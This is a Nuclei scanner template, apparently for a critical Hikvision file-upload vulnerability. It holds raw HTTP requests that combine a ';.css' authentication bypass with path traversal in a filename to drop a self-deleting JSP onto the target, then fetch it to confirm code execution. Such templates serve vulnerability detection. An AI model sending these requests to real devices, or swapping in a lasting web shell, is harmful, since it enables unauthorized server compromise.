id: hikvision-fileupload-lm_api_files

info:
  name: hikvision-fileupload-lm_api_files
  author: hikvision-fileupload-lm_api_files
  severity: critical

variables:
  a1: "{{to_lower(rand_base(5))}}"
  a2: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(10))}}"

requests:
  - raw:
      - |
        POST /lm/api/files;.css HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Cache-Control: max-age=0
        Connection: close
        Content-Type: multipart/form-data; boundary=----{{boundary}}
        Upgrade-Insecure-Requests: 1
        Accept-Encoding: gzip, deflate
        Content-Length: 264

        ------{{boundary}}
        Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.1/webapps/els/static/{{a1}}.jsp"
        Content-Type: application/zip

        <% out.println("{{a2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------{{boundary}}--
      - |
        GET /els/static/{{a1}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Cache-Control: max-age=0
        Connection: close
        Upgrade-Insecure-Requests: 1
        Accept-Encoding: gzip, deflate
        Content-Length: 0

    matchers:
      - type: dsl
        dsl:
          - contains(body_2,"{{a2}}") && status_code==200


